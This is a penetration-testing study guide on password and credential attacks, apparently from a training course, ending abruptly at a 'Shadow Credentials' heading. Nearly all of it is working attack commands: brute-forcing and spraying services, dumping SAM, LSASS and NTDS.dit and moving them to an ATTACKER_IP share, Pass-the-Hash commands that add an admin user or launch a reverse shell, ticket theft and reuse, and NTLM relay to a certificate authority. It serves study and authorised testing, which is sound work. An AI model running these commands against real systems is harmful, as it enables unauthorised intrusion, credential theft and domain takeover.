# Password Attacks

Authentication validates identity through factors:

* Something you know: password or PIN
* Something you have: card or device
* Something you are: biometrics
* Somewhere you are: IP address or location

Passwords still dominate, and humans are the weak point: \~66% reuse passwords across accounts, while \~55% keep a password after it appears in a breach. HaveIBeenPwned tells you—or your target—which breaches an email has appeared in. One cracked password often opens other platforms.

## Introduction to Password Cracking

Hashes are one-way:

```bash
echo -n 'Soccer06!' | md5sum
echo -n 'Soccer06!' | sha256sum
```

*   **Rainbow tables** — Precomputed input-to-hash maps that enable instant lookups. Salting defeats them: random bytes are added before hashing.

    ```bash
    echo -n 'Th1sIsTh3S@lt_Soccer06!' | md5sum
    ```

    Salts are not secret. They are stored alongside the hash because they are needed for verification. They expand the required table size: one salt byte means 256× as many entries.
* **Brute-force** — Attempts every combination. It is 100% effective given enough time, but realistic only under \~9 characters. Speed is algorithm-bound: hashcat on a laptop is approximately 5M/s against MD5 versus \~10k/s against DCC2.
* **Dictionary** — Uses a wordlist of statistically likely passwords. This is the pentester's default. `rockyou.txt` contains 14M real passwords leaked from RockYou in 2009, where they were stored unencrypted. SecLists is another main source.

## Introduction to John The Ripper

Use the **jumbo** variant for optimizations, more formats, and 64-bit support.

### Cracking modes

*   **Single crack** — Generates candidates from the account's own data, including username, home directory, and GECOS real name or phone number. Built for Linux passwd/shadow files.

    ```bash
    john --single passwd
    ```
*   **Wordlist** — Dictionary mode. Multiple lists can be comma-separated, and `--rules` mutates candidates.

    ```bash
    john --wordlist=<wordlist> <hash_file>
    ```
*   **Incremental** — Markov-modeled brute force that tries likely combinations first. This is the slowest mode. Configure character sets in `john.conf` under `[Incremental:...]`.

    ```bash
    john --incremental <hash_file>
    ```

### Identifying hash formats

Check JtR sample-hash documentation, or use:

```bash
hashid -j 193069ceb0461e1d40d216e32c79c704     # suggests formats + JtR format names
```

`hashid` is often ambiguous: a bare 32-hex string can match MD2, MD5, MD4, NTLM, and more. The context where the hash came from usually determines its format.

Specify the format with `--format=`. Common formats include:

* `raw-md5`
* `raw-sha1/sha256/sha512`
* `nt`
* `netntlmv2`
* `mysql`
* `mysql-sha1`
* `mssql`
* `mssql05`
* `krb5`
* `mscash2`
* `ssh`
* `pdf`
* `zip`
* `rar`

### Cracking encrypted files

The \*2john converters produce JtR-ready hashes:

```bash
<tool> <file_to_crack> > file.hash
locate *2john        # full inventory on the box
```

Available tools include:

`ssh2john`, `zip2john`, `rar2john`, `pdf2john`, `office2john`, `keepass2john`, `bitlocker2john`, `gpg2john`, `putty2john`, `pfx2john`, `keychain2john`, `vncpcap2john`, `hccap2john/wpa2john`, `truecrypt_volume2john`, `mscash2john`, `1password2john`, `7z2john`, `androidbackup2john`.

## Introduction to Hashcat

```bash
hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```

* `-a` is the attack mode.
* `-m` is the hash type ID.
* `hashcat --help` lists hash types.
* The hashcat.net example hashes page helps with identification.
* `hashid -m <hash>` suggests a hashcat mode.

### Dictionary attack (`-a 0`)

```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 rockyou.txt
# wordlist not enough → apply rules:
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c rockyou.txt -r best64.rule
```

Rules live in `/usr/share/hashcat/rules`. Examples include:

* `best64`
* `dive`
* `d3ad0ne`
* `generated`
* `rockyou-30000`
* `T0XlC*`
* `toggles*`
* Leetspeak variants

### Mask attack (`-a 3`)

A mask performs brute force over a user-defined keyspace.

Built-in character sets:

```
?l ?u ?d ?h ?H ?s ?a ?b
```

Create custom character sets with `-1` through `-4`, then reference them as `?1` through `?4`.

```bash
hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'    # uppercase + 4 lowercase + digit + symbol
```

## Writing Custom Wordlists and Rules

Users follow predictable mutations to satisfy policies:

```
Password → Password123 → Password2022 → Password2022! → P@ssw0rd2022!
```

Company names, pets, hobbies, months or seasons plus a year are common ingredients. OSINT feeds this process. Most passwords are ≤10 characters.

### Hashcat rule syntax

```
:      do nothing
l / u  lowercase / uppercase all
c      capitalize first, lowercase rest
sXY    replace all X with Y
$!     append !
```

Create `custom.rule` by combining `c`, `so0`, `sa@`, `$!`, and combinations of them. Then run:

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

One word can produce 15 variants.

### Build target-specific wordlists with CeWL

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
# -d spider depth, -m min word length
```

## Cracking Protected Files

{% stepper %}
{% step %}
## Hunt for document types

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
```
{% endstep %}

{% step %}
## Find SSH keys

SSH keys have no extension. Find them by header or footer:

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

Old PEM keys declare encryption in the header:

```
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
```

Modern keys look identical whether encrypted or not. Test them:

```bash
ssh-keygen -yf key
```

A passphrase prompt means the key is encrypted.
{% endstep %}

{% step %}
## Crack SSH keys

```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
```
{% endstep %}

{% step %}
## Crack Office and PDF documents

```bash
office2john.py Protected.docx > hash
pdf2john.py PDF.pdf > hash
```

Then use JtR or hashcat. It is worth trying even against strong passwords because file contents often provide further access.
{% endstep %}
{% endstepper %}

## Cracking Protected Archives

Common archive types include tar, gz, rar, zip, cpt, truecrypt, bitlocker, kdbx, 7z, and gzip. Not all support passwords natively. For example, tar is usually encrypted with openssl or gpg on top.

Retrieve a full extension reference:

```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

### ZIP

```bash
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

### OpenSSL-encrypted GZIP

Identify it with `file`. It reports:

```
openssl enc'd data with salted password
```

Hash cracking can be unreliable. A more reliable method is to loop through decryption attempts and let successful extraction identify the password. Gzip errors are normal noise.

```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
# check ls afterwards for the extracted file
```

### BitLocker

BitLocker uses AES 128/256 and full-disk encryption. A 48-digit recovery key may also exist.

```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash    # hashes 1-2 = password, 3-4 = recovery key (don't bother)
hashcat -a 0 -m 22100 '$bitlocker$0$...' rockyou.txt   # slow (~25 H/s) — be patient
```

Mounting on Windows: double-click the `.vhd`, then enter the password for the BitLocker volume.

Mounting on Linux with dislocker:

```bash
sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker /media/bitlockermount
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
# cleanup: umount /media/bitlockermount && umount /media/bitlocker
```

## Network Services

Every service with username/password authentication is a password-attack surface:

* FTP
* SMB
* NFS
* IMAP/POP3
* SSH
* MySQL/MSSQL
* RDP
* WinRM
* VNC
* Telnet
* SMTP
* LDAP

### WinRM

WinRM uses TCP 5985 for HTTP and TCP 5986 for HTTPS. NetExec validates credentials quickly:

```bash
netexec winrm <TARGET_IP> -u user.list -p password.list
# [+] None\user:password (Pwn3d!)   ← Pwn3d! = likely command execution

evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>    # gem install evil-winrm
```

### SSH

```bash
hydra -L user.list -P password.list ssh://<TARGET_IP>     # add -t 4, SSH limits parallel tasks
ssh user@<TARGET_IP>
```

### RDP

```bash
hydra -L user.list -P password.list rdp://<TARGET_IP>     # -t 1/-t 4, -W 1/-W 3 — RDP hates parallel connections
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

### SMB

```bash
hydra -L user.list -P password.list smb://<TARGET_IP>
```

Hydra returning `[ERROR] invalid reply` against SMBv3 means Hydra is outdated. Rebuild it or use `auxiliary/scanner/smb/smb_login`, setting `USER_FILE`, `PASS_FILE`, and `RHOSTS`.

After valid credentials:

```bash
netexec smb <TARGET_IP> -u user -p password --shares
smbclient -U user \\\\<TARGET_IP>\\<SHARE>
```

## Spraying, Stuffing, and Defaults

### Password spraying

One password against many accounts. This is dangerous where new users receive a standard initial password such as `ChangeMe123!`.

Use Burp for web applications or NetExec/Kerbrute for Active Directory:

```bash
netexec smb <SUBNET>/24 -u usernames.list -p 'ChangeMe123!'
```

### Credential stuffing

Replay leaked username/password pairs elsewhere:

```bash
hydra -C user_pass.list ssh://<TARGET_IP>
```

### Default credentials

Common for routers, firewalls, and databases.

```bash
pip3 install defaultcreds-cheat-sheet
creds search linksys
```

Classic router defaults:

| Product                  | Default credentials            |
| ------------------------ | ------------------------------ |
| Linksys/D-Link/3Com/BenQ | `admin:Admin` at `192.168.1.1` |
| Belkin                   | `admin:admin`                  |
| Netgear                  | `admin:password`               |
| Digicom                  | `admin:Michelangelo`           |

Also check product documentation.

## Windows Authentication Process

The interactive logon chain is:

```
WinLogon → LogonUI → COM credential providers → LSASS → authentication packages → SAM or AD
```

Authentication components:

* **Lsasrv.dll** — LSA server; Negotiate chooses NTLM or Kerberos.
* **Msv1\_0.dll** — Local machine logons.
* **Samsrv.dll** — SAM local accounts.
* **Kerberos.dll** — Kerberos authentication.
* **Netlogon.dll** — Network logon service.
* **Ntdsa.dll** — DSA managing `ntds.dit` on domain controllers only.

### SAM

SAM stores local account LM/NTLM hashes at:

```
%SystemRoot%\system32\config\SAM
```

It is mounted at `HKLM\SAM` and requires SYSTEM privileges to read.

* A workgroup machine validates against the local SAM.
* A domain-joined machine validates against `ntds.dit` on the domain controller.
* `ntds.dit` is located at `%SystemRoot%\ntds.dit`.
* SYSKEY partially encrypts SAM on disk.
* Credential Manager stores per-user credentials at `C:\Users\<user>\AppData\Local\Microsoft\[Vault/Credentials]\`.
* `NTDS.dit` contains user accounts and hashes, groups, computers, and GPOs, synchronized across domain controllers.

## Attacking SAM, SYSTEM, and SECURITY

With local administrator access, save the hives:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

* SAM contains local hashes.
* SYSTEM contains the bootkey that decrypts SAM.
* SECURITY contains DCC2 cached domain credentials, LSA secrets, and DPAPI keys.

Exfiltrate with an attacker SMB share. Use `-smb2support` because older SMB configurations may not connect:

```bash
impacket-smbserver -smb2support CompData /home/user/share
```

```cmd
move sam.save \\<ATTACKER_IP>\CompData
```

Dump offline. `secretsdump` pulls the bootkey from SYSTEM, then SAM, cached domain logons, LSA secrets, and DPAPI keys:

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

The SAM format is:

```
uid:rid:lmhash:nthash
```

Crack NT hashes with mode 1000:

```bash
hashcat -m 1000 hashestocrack.txt rockyou.txt
```

### DCC2

Cached domain credentials from SECURITY use the format:

```
$DCC2$10240#user#<hash>
```

DCC2 uses PBKDF2, is \~800× slower than NTLM, and cannot be used for Pass the Hash. Use mode 2100.

### DPAPI

DPAPI keys from the dump can unlock Chrome and IE saved passwords, Outlook, saved RDP credentials, and Credential Manager data.

Decrypt with:

* Impacket's `dpapi` tool
* Mimikatz: `dpapi::chrome /in:"...\Login Data" /unprotect`
* DonPAPI

### Remote one-shots

```bash
netexec smb <TARGET_IP> --local-auth -u bob -p <PASSWORD> --lsa    # LSA secrets + dpapi keys + NL$KM
netexec smb <TARGET_IP> --local-auth -u bob -p <PASSWORD> --sam    # local SAM hashes
```

## Attacking LSASS

LSASS caches credentials, mints tokens, and writes the security log. Dump its memory and crack credentials offline.

### Task Manager

With a GUI session:

```
Processes → Local Security Authority Process → Create dump file
```

The dump is written as `lsass.DMP` in `%temp%`.

### Rundll32

Modern antivirus commonly flags this approach:

```cmd
tasklist /svc                    # find lsass.exe PID
Get-Process lsass                # PowerShell alternative
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Extract from the Linux attack host with pypykatz:

```bash
pypykatz lsa minidump lsass.dmp
```

### Logon-session output

* **MSV** — Username, domain, SID, NT and SHA1 hashes.
* **WDIGEST** — Cleartext passwords when enabled. Enabled by default on XP–8 and 2003–2012; disabled on modern Windows. A patch exists for old systems.
* **Kerberos** — Cached passwords, ekeys, tickets, and PINs that can be reused for domain access.
* **DPAPI** — Masterkeys that decrypt that user's DPAPI blobs.

```bash
hashcat -m 1000 <NTHASH> rockyou.txt
```

## Attacking Windows Credential Manager

Vault folders include:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
...\Credentials\
```

Roaming, ProgramData, and systemprofile variants also exist.

Each vault contains a `Policy.vpol` file with DPAPI-protected AES keys that encrypt credentials. Newer Windows versions add Credential Guard with VBS-protected masterkeys.

Two credential locker types exist:

* **Web Credentials** — IE and legacy Edge.
* **Windows Credentials** — OneDrive tokens, domain credentials, shares, and services.

Enumerate and abuse them:

```cmd
cmdkey /list                                  # Target / Type / User / Persistence per entry
runas /savecred /user:SRV01\mcharles cmd      # use a stored Domain:interactive credential
rundll32 keymgr.dll,KRShowKeyMgr              # export vault to .crd
```

With mimikatz as administrator:

```
privilege::debug
sekurlsa::credman
```

This dumps stored credentials from memory. SharpDPAPI, LaZagne, and DonPAPI provide similar functionality.

## Attacking Active Directory and NTDS.dit

Domain-joined machines still permit local SAM logons using `HOSTNAME\user` or `.\user` at the logon UI.

Dictionary attacks against AD are noisy because event 4776 occurs for every NTLM validation and account lockouts are possible. Historically, the default domain GPO has **no** account lockout policy.

### Build a username list

Common conventions:

```
jdoe
jjdoe
janedoe
jane.doe
doe.jane
```

Email addresses often reveal usernames:

```
jdoe@domain → jdoe
```

Useful sources:

* Google `"@inlanefreight.com"` for valid addresses.
* Search `inlanefreight.com filetype:pdf` for usernames in PDF metadata.
* Some organizations alias real usernames to opaque usernames such as `a907` to hinder spraying.

```bash
./username-anarchy -i names.txt                  # auto-generate every convention per name

# confirm valid usernames before password guessing (Kerberos pre-auth enumeration):
./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <DOMAIN> names.txt

# dictionary attack via SMB:
netexec smb <DC_IP> -u bwilliamson -p fasttrack.txt
# [+] ...:P@55w0rd!  → watch lockout policy; one attempt per user is safer (spraying)
```

### Capturing NTDS.dit

Requires local administrator or Domain Admin access on the domain controller:

```bash
evil-winrm -i <DC_IP> -u bwilliamson -p '<PASSWORD>'
```

```powershell
net localgroup          # check Administrators membership
net user bwilliamson    # check Domain Admins membership
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER_IP>\CompData
```

Like SAM, NTDS hashes are encrypted with a key in SYSTEM. Obtain both files and dump offline:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL    # finds/decrypts the PEK, dumps all domain hashes (+ AES keys for Kerberos)
```

Or use the one-liner that performs VSS, dumping, and cleanup:

```bash
netexec smb <DC_IP> -u bwilliamson -p '<PASSWORD>' -M ntdsutil
# filter enabled accounts afterwards:
grep -iv disabled <ntds-output-file> | cut -d ':' -f1
```

Crack with `-m 1000`. If the Administrator hash remains uncrackable, use Pass the Hash:

```bash
evil-winrm -i <DC_IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Credential Hunting in Windows

Search terms worth grepping:

```
passwords
passphrases
keys
username
user account
creds
users
passkeys
configuration
dbcredential
dbpassword
pwd
login
credentials
```

Windows Search works with GUI access. From the command line:

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

LaZagne harvests application-stored credentials. Keep a standalone copy available for targets:

```cmd
start LaZagne.exe all        :: -vv for verbose; per-module: browsers, chats, mails, memory, sysadmin, windows, wifi
```

Browsers are the richest target: 35 are supported on Windows. Chrome, Edge, and Firefox stores are encrypted but decryptable with `firefox_decrypt` or `decrypt-chrome-passwords`.

Also check:

* Passwords in GPO or scripts on SYSVOL
* Scripts on IT shares
* `web.config` on development machines
* `unattend.xml`
* AD user and computer description fields
* KeePass databases
* Files named `pass.txt`, `passwords.docx`, or `passwords.xlsx`
* Systems, shares, and SharePoint

## Linux Authentication Process

PAM uses `pam_unix.so` at:

```
/usr/lib/x86_64-linux-gnu/security/
```

It reads and writes `/etc/passwd` and `/etc/shadow`.

### `/etc/passwd`

Seven colon-separated fields:

```
username:password:UID:GID:GECOS:home:shell
```

It is world-readable.

* `x` means the hash is stored in shadow.
* A hash in this file on ancient systems is crackable.
*   A writable passwd file allows blanking root's password field:

    ```
    root::0:0:...
    ```

    This enables passwordless `su`.

### `/etc/shadow`

Nine fields with password format:

```
$<id>$<salt>$<hashed>
```

| ID   | Algorithm     |
| ---- | ------------- |
| `1`  | MD5           |
| `2a` | Blowfish      |
| `5`  | SHA-256       |
| `6`  | SHA-512       |
| `y`  | yescrypt      |
| `gy` | gost-yescrypt |
| `7`  | scrypt        |

* `!` or `*` means no password login, though other authentication methods may work.
* An empty field means no password is required.
* MD5 cracks much faster than SHA-512.

### Password history

```
/etc/security/opasswd
```

This root-readable file contains PAM old-password history. Old hashes may reveal patterns for guessing current passwords.

### Cracking Linux credentials

```bash
cp /etc/passwd /tmp/passwd.bak; cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt    # 1800 = sha512crypt
```

This scenario is exactly what JtR single crack mode was designed for.

## Credential Hunting in Linux

Four hunting buckets:

* **Files** — Configuration files, databases, notes, scripts, cronjobs, and SSH keys.
* **History** — Logs and command history.
* **Memory** — Cache and in-memory processing.
* **Key-rings** — Browser stores.

Adapt to the system's role. An isolated database server may not have normal users.

### Files, databases, scripts, cronjobs, history, and logs

```bash
# config files (.conf/.config/.cnf), then grep them for creds
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# databases
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# notes (named anything, extension or not)
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# cronjobs (creds hardcoded for automation)
cat /etc/crontab
ls -la /etc/cron.*/          # .d, .daily, .hourly, .monthly, .weekly

# history
tail -n5 /home/*/.bash*      # .bash_history, .bashrc, .bash_profile

# logs — auth hits
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|failure\|failed\|ssh\|sudo\|COMMAND\=" $i 2>/dev/null;fi;done
```

Key log files:

* `/var/log/auth.log` on Debian
* `secure` on RHEL
* `faillog`
* `cron`
* `mail.log`
* `httpd`
* `mysqld.log`
* `syslog` or `messages`

### Memory and credential stores

```bash
sudo python3 mimipenguin.py              # plaintext creds from memory (GNOME keyring etc.)
sudo python2.7 laZagne.py all            # wifi, ssh, shadow, AWS, keepass, git, browsers, keyrings...
```

Firefox stores saved logins in:

```
~/.mozilla/firefox/<profile>/logins.json
```

The corresponding key is `key4.db`. Decrypt with:

```bash
python3.9 firefox_decrypt.py
```

Or:

```bash
python3 laZagne.py browsers
```

## Credential Hunting in Network Traffic

Legacy or misconfigured services can still transmit plaintext.

| Insecure or legacy | More secure alternative |
| ------------------ | ----------------------- |
| HTTP               | HTTPS                   |
| FTP                | FTPS                    |
| SNMP               | SNMPv3                  |
| POP3               | POP3S                   |
| IMAP               | IMAPS                   |
| SMTP               | SMTPS                   |
| LDAP               | LDAPS                   |
| DNS                | DoH                     |
| SMB                | SMB3-over-TLS           |
| VNC                | VNC-TLS                 |

Useful Wireshark filters:

```
http                                  # plaintext web traffic
http.request.method == "POST"         # form logins
http contains "passw"                 # string in packets (also Edit > Find Packet)
ip.addr == <IP> / tcp.port == 80
tcp.stream eq 53                      # follow one conversation
ip.src == A && ip.dst == B
tcp.flags.syn == 1 && tcp.flags.ack == 0   # scanning/connection attempts
```

Pcredz automates credential extraction over pcaps or live interfaces. It pulls credit card numbers, POP/SMTP/IMAP credentials, SNMP community strings, FTP credentials, HTTP Basic/NTLM headers and forms, NTLMv1/v2 from SMB/LDAP/MSSQL/RPC/HTTP, and Kerberos AS-REQ pre-auth etype 23 hashes.

```bash
./Pcredz -f demo.pcapng -t -v
```

## Credential Hunting in Network Shares

Start with patterns:

* Keywords: `passw`, `user`, `token`, `key`, `secret`
* Extensions: `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat`
* Filenames containing `config`, `user`, `passw`, `cred`, or `initial`
* The `DOMAIN\` string inside files

Localize keywords for the target. For example, use `Benutzer` for a German organization. Prioritize IT shares over photo shares.

### Windows

```cmd
Snaffler.exe -s      :: auto-discovers shares + interesting files (e.g. unattend.xml AdministratorPassword hits)
                     :: -u search for AD user references, -i/-n include/exclude shares
```

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public   # PowerHuntShares — HTML report, hours in big envs
```

### Linux

```bash
# MANSPIDER (docker), content search:
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET_IP> -c 'passw' -u <USER> -p '<PASSWORD>'

# NetExec spider:
nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --spider IT --content --pattern "passw"
```

Manual review is required because false positives are common.

## Pass the Hash (PtH)

NTLM hashes are unsalted and static until the password changes. Authenticate with the hash without cracking it.

Hash sources include:

* SAM dumps
* `NTDS.dit`
* LSASS memory

### Windows

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTHASH> /domain:inlanefreight.htb /run:cmd.exe" exit
```

Invoke-TheHash does not require local administrator rights on the client, but the hash account needs administrator rights on the target:

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username julio -Hash <NTHASH> -Command "net user mark Password123 /add && net localgroup administrators mark /add"
Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username julio -Hash <NTHASH> -Command "powershell -e <base64-revshell>"
```

### Linux

```bash
impacket-psexec administrator@<TARGET_IP> -hashes :<NTHASH>     # also: wmiexec, atexec, smbexec

netexec smb <SUBNET>/24 -u Administrator -d . -H <NTHASH>            # spray the hash across the subnet
netexec smb <SUBNET>/24 -u Administrator --local-auth -H <NTHASH>    # local-admin hash reuse (gold images)
netexec smb <TARGET_IP> -u Administrator -d . -H <NTHASH> -x whoami  # Pwn3d! + command exec

evil-winrm -i <TARGET_IP> -u Administrator -H <NTHASH>               # domain account: administrator@domain
xfreerdp /v:<TARGET_IP> /u:julio /pth:<NTHASH>                       # RDP PtH — needs Restricted Admin Mode
```

### RDP PtH prerequisite

Without this, RDP may return an “Account restrictions...” error:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

UAC limits PtH for **local** accounts:

* `LocalAccountTokenFilterPolicy = 0` means only the built-in RID-500 Administrator can perform remote administration.
* `FilterAdministratorToken = 1` enrolls even RID-500 in UAC.
* Domain accounts with administrator rights are exempt.
* Local administrator password reuse across hosts is common due to gold images.
* LAPS is the client-side fix.

## Pass the Ticket (PtT) from Windows

Kerberos flow:

```
User encrypts a timestamp with their password hash
→ KDC validates it and returns a TGT
→ TGT requests a TGS for each service
```

A stolen TGS enables access to one resource. A stolen TGT enables access to anything the user can reach, without knowing the password.

### Harvest tickets

As administrator, this obtains all tickets. Non-administrators only obtain their own.

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export     :: .kirbi files; ending in $ = computer account; service "krbtgt" = that account's TGT

Rubeus.exe dump /nowrap                 :: same data as Base64
```

### Pass the Key / OverPass the Hash

Convert a key or hash into a new TGT. First dump keys:

```cmd
mimikatz # sekurlsa::ekeys      :: yields aes256_hmac + rc4_hmac per user
```

```cmd
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256KEY> /nowrap     :: Rubeus needs no admin
```

Prefer AES keys over RC4 or NTLM in Kerberos exchanges. RC4 in a modern 2008+ domain suggests encryption downgrade.

### Import tickets

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<HASH> /ptt      :: request + import in one
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
Rubeus.exe ptt /ticket:<base64-kirbi>
mimikatz # kerberos::ptt ticket.kirbi        :: misc::cmd opens a cmd with the ticket applied

# kirbi -> base64:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

Then access resources:

```powershell
dir \\DC01\c$
Enter-PSSession -ComputerName DC01
```

PowerShell Remoting requires administrator or Remote Management Users membership.

To avoid overwriting the current session's TGT, create a sacrificial logon session:

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
:: then run asktgt /ptt from the new window
```

## Pass the Ticket (PtT) from Linux

Linux stores tickets as:

* **ccache** files, such as `/tmp/krb5cc_*`, with the path in `KRB5CCNAME`
* **keytab** files containing a principal and encrypted key pairs

Keytabs are portable but must be recreated after password changes.

The machine-account keytab is:

```
/etc/krb5.keytab
```

It is root-only. Owning it allows impersonation of `HOST$`.

### Confirm domain membership

```bash
realm list                          # domain, permitted users/groups
ps -ef | grep -i "winbind\|sssd"    # fallback check
```

### Find tickets and keytabs

```bash
find / -name *keytab* -ls 2>/dev/null      # need rw on the file to use it
env | grep -i krb5                          # KRB5CCNAME=FILE:/tmp/krb5cc_...
ls -la /tmp                                 # every logged-in user's ccache
crontab -l                                  # scripts often kinit with a keytab
```

### Impersonate with a keytab

```bash
klist -k -t /opt/specialfiles/carlos.keytab     # shows the principal — kinit is CASE-SENSITIVE (user lowercase, DOMAIN uppercase)
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist                                            # confirm new default principal
smbclient //dc01/carlos -k -no-pass -c ls
```

### Extract keytab secrets

```bash
python3 keytabextract.py carlos.keytab      # → NTLM, AES-256, AES-128 hashes
# NTLM → PtH; AES → forge tickets or crack (crackstation.net is fast for NTLM)
```

### Reuse a ccache

Read access is enough. Root can access every user's ccache.

```bash
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist                                        # check principal + expiry — expired tickets are dead
smbclient //dc01/C$ -k -no-pass
```

### Use tickets from a non-domain attack host

Proxy to the KDC using Chisel and proxychains, then hardcode name resolution:

```bash
# /etc/hosts: 172.16.1.10 inlanefreight.htb dc01.inlanefreight.htb dc01
# /etc/proxychains.conf: socks5 127.0.0.1 1080
sudo ./chisel server --reverse                      # attacker
c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks   # on MS01

export KRB5CCNAME=/path/to/krb5cc_file
proxychains impacket-wmiexec dc01 -k                # hostname, never IP; -no-pass if prompted
```

### evil-winrm over Kerberos

```bash
sudo apt-get install krb5-user -y        # realm = DOMAIN (uppercase), KDC = dc01
# /etc/krb5.conf: [libdefaults] default_realm = <REALM>; [realms] <REALM> = { kdc = dc01.domain }
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Ticket conversion

```bash
impacket-ticketConverter krb5cc_... julio.kirbi    # ccache <-> kirbi, both directions
```

Linikatz from Cisco is mimikatz for Linux AD systems. As root, it pulls credentials and tickets from SSSD, FreeIPA, Samba, and Vintella into a `linikatz.*` folder, containing ccache and keytab formats ready for reuse.

## Pass the Certificate

PKINIT performs Kerberos initial authentication with public keys such as smart cards. Pass-the-Certificate exchanges an X.509 certificate for a TGT. It pairs with AD CS attacks and Shadow Credentials.

### ESC8

Relay NTLM to the CA HTTP web enrollment endpoint at `/CertSrv`:

```bash
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
python3 printerbug.py <DOMAIN>/user:'<PASSWORD>'@<DC_IP> <ATTACKER_IP>    # coerce DC01$ to authenticate (needs Spooler)
# relay output: GOT CERTIFICATE → DC01$.pfx
```

Exchange the PFX for a TGT using PKINITtools:

```bash
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip <DC_IP> '<DOMAIN>/dc01$' /tmp/dc.ccache
# note the AS-REP encryption key it prints — needed for some follow-ups
```

Reuse the ticket, then DCSync as `DC01$`:

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@DC01.<DOMAIN>
```

### Shadow Credentials

